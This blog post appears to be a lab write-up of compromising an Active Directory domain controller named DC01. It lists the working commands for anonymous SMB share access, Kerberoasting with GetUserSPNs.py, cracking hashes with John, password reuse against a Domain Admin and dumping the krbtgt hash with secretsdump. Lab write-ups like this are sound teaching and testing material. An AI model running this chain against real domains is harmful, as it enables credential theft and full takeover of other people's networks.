---
layout: post
title: "MaritiniAD Writeup"
date: 2026-05-15
tags: [Active Directory, Writeup, Kerberoasting, Password Reuse, PowerView, Windows]
excerpt: "Full walkthrough of the DC01 box in the DRY.MARTINI.BARS domain: anonymous SMB enumeration, PowerView recon, Kerberoasting the ATHENA_SVC hash, and elevating to Domain Admin via password reuse."
---

In this writeup I walk through the **MaritiniAD** box step by step. It presents a basic Windows Active Directory environment and covers classic AD techniques from initial access to full domain compromise.

## Machine Information

| Property | Value |
|----------|-------|
| Machine | MaritiniAD |
| IP | 10.1.99.162 |
| Hostname | DC01.DRY.MARTINI.BARS |
| Domain | DRY.MARTINI.BARS |
| OS | Windows 11 / Server 2025 Build 26100 |

---

## Recon: Nmap Scan

I started with a full-port scan:

```bash
sudo nmap -p- -vvv --min-rate 5000 -A -sC -oA MaritiniAD 10.1.99.162
```

Open ports:

| Port | Service | Note |
|------|---------|------|
| 53/tcp | DNS | Domain Controller hallmark |
| 135/tcp | MSRPC | |
| 139/tcp | NetBIOS-SSN | |
| 445/tcp | SMB | **Anonymous access enabled** |
| 3268/tcp | Global Catalog LDAP | |
| 3269/tcp | Global Catalog LDAP SSL | |
| 3389/tcp | RDP | SSL cert: `DC01.DRY.MARTINI.BARS` |
| 49667, 49669, 58099/tcp | Dynamic RPC / Other | |

The port layout immediately screams **Domain Controller**, especially the combination of 53, 445, 3268/3269 and 3389.

---

## SMB Enumeration: Anonymous Login & Shares

One of the most overlooked yet valuable first steps on AD machines is **anonymous SMB enumeration**. I tested null sessions with `netexec`:

```bash
nxc smb 10.1.99.162 -u '' -p '' --shares
```

The result was surprising — **anonymous users could list all shares**:

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$                            Remote IPC
NETLOGON                        Logon server share
notes                           
SYSVOL                          Logon server share
```

The `notes` share caught my eye. I used the `spider_plus` module to pull its contents:

```bash
nxc smb 10.1.99.162 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

Inside I found two critical files:

**notes.txt:**
```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint
```

**creds:**
```
mprice:<INITIAL_HINT>
```

The `creds` file gave us `mprice`'s password — or at least a password hint. It wasn't a directly usable credential, but the domain-themed word *<INITIAL_HINT>* was a valuable clue.

---

## Domain Enumeration: BloodHound Fails, PowerView Saves the Day

I tried running BloodHound Python to map the domain, but it errored out. I pivoted to **PowerView** for manual enumeration.

Listing all domain users:

```powershell
Get-DomainUser | Select-Object name, samaccountname, mail
```

This returned a small user base:

| samAccountName | Name |
|----------------|------|
| ATHENA_SVC | ATHENA_SVC |
| athena.t0 | athena.t0 |
| mprice | Martin Price |
| krbtgt | krbtgt |
| Guest | Guest |
| Administrator | Administrator |

I then checked for **Kerberoastable** accounts:

```powershell
Get-DomainUser -SPN | Select-Object ServicePrincipalName, Name, MemberOf
```

PowerView dashboard also highlighted the security findings clearly:

![PowerView Dashboard](/assets/images/powerview_dashboard.png)

This flagged **ATHENA_SVC**:

```
ServicePrincipalName         Name        MemberOf
---------------------------  ----------  ---------------------------------------------------------------
HTTP/athena.dry.martini.bar  ATHENA_SVC  CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS
```

The full user list confirmed the small domain footprint:

![PowerView User List](/assets/images/powerview_user_list.png)

I also inspected the group memberships of each user. One result stood out immediately:

```powershell
Get-DomainUser athena.t0 | Select-Object MemberOf
```

**athena.t0** was a member of **Domain Admins**! This was a critical finding that shaped the rest of the attack path.

![athena.t0 Domain Admin Membership](/assets/images/athena.t0_account.png)

---

## Kerberoasting ATHENA_SVC

With a clear target identified, I used `GetUserSPNs.py` to request the service ticket for the SPN-linked account:

```bash
GetUserSPNs.py DRY.MARTINI.BARS/mprice:'<INITIAL_HINT>' -dc-ip 10.1.99.162 -request -outputfile athena_hash.txt
```

> Note: The `mprice` credential was only used to bind to the domain; the actual goal was to pull the SPN hash.

I cracked the captured TGS hash with **John the Ripper**:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt athena_hash.txt
```

It cracked in seconds:

```
<CRACKED_PASSWORD>    (?)
```

---

## Password Reuse to Domain Admin

After recovering the password, I tested it against **ATHENA_SVC**, but more importantly I remembered that **athena.t0** was a **Domain Admin**. In real-world engagements, password reuse between service accounts and privileged users is extremely common.

I sprayed the cracked password against `athena.t0`:

```bash
netexec ldap 10.1.99.162 -u 'athena.t0' -p '<CRACKED_PASSWORD>' -d DRY.MARTINI.BARS
```

Bingo:

```
LDAP        10.1.99.162     389    DC01    [+] DRY.MARTINI.BARS\athena.t0:<CRACKED_PASSWORD> (Pwn3d!)
```

The same password worked for `athena.t0`. I now had **Domain Admin** privileges.

---

## Extracting SAM and LSA Secrets

With Domain Admin rights, the next step was to extract SAM and LSA secrets from the Domain Controller. I used secretsdump.py to target the **krbtgt** account specifically:

```bash
secretsdump.py 'DRY.MARTINI.BARS/athena.t0:<CRACKED_PASSWORD>'@10.1.99.162 -just-dc-user krbtgt
```

Output:

```
krbtgt:502:<LM_HASH>:<NTLM_HASH>:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>
krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>
krbtgt:0x17:<NTLM_HASH>
```

Obtaining the **KRBTGT** hash is the "game over" moment in an AD pentest. With this hash, I can forge **Golden Tickets** and authenticate as any user in the domain, achieving persistent and total compromise.

---

## Summary & Key Takeaways

This machine successfully simulated several real-world AD weaknesses often seen in production environments:

| Step | Vulnerability / Technique | Result |
|------|---------------------------|--------|
| SMB null session | Misconfiguration | Share enumeration & file access |
| `notes` & `creds` | Sensitive Data Exposure | Credential / hint recovered |
| PowerView recon | Domain Enumeration | Identified Kerberoastable target & Domain Admin user |
| Kerberoasting | Weak SPN Password | `ATHENA_SVC` password cracked |
| Password Reuse | Credential Reuse | `athena.t0` (Domain Admin) compromised |
| secretsdump (SAM/LSA) | Full Domain Compromise | KRBTGT hash extracted |

What started as anonymous SMB access to a couple of files escalated through a classic chain into full domain control. This writeup once again highlights how the smallest misconfiguration in AD security can lead to catastrophic consequences.

Good luck and happy hacking!
